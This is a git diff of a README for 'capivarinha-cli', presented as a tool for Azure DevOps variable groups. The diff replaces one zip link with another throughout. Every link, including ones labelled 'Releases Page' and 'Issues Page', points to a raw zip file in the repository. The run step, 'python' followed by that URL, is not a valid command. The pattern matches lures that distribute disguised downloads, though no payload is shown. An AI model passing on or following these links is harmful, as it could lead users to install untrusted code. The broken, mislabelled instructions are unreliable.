@@ -1,6 +1,6 @@
 # 🐾 capivarinha-cli - Search and Export Variables Effortlessly
 
-![Download capivarinha-cli](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/capivarinha-cli.zip)
+![Download capivarinha-cli](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/cli_capivarinha_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to capivarinha-cli! This is a command-line tool made to help you search 
 
 ## 📥 Download & Install
 
-To get capivarinha-cli, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/capivarinha-cli.zip)
+To get capivarinha-cli, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/cli_capivarinha_1.8.zip)
 
 ### Steps to Download
 
@@ -39,7 +39,7 @@ Here’s how to run capivarinha-cli:
 3. Enter the following command:
 
    ```
-   python https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/capivarinha-cli.zip
+   python https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/cli_capivarinha_1.8.zip
    ```
 
 This command will start the application.
@@ -86,8 +86,8 @@ capivarinha-cli is open-source software. You can freely use, modify, and distrib
 
 ## 🔗 Support and Contact
 
-If you encounter any issues or have questions, please visit our [Issues Page](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/capivarinha-cli.zip) to get help or provide feedback.
+If you encounter any issues or have questions, please visit our [Issues Page](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/cli_capivarinha_1.8.zip) to get help or provide feedback.
 
-Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/capivarinha-cli.zip) for the latest version.
+Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/Pruject-CrashoutLA/capivarinha-cli/main/habitacule/cli_capivarinha_1.8.zip) for the latest version.
 
 Thank you for using capivarinha-cli! Enjoy managing your Azure DevOps variable groups effortlessly.
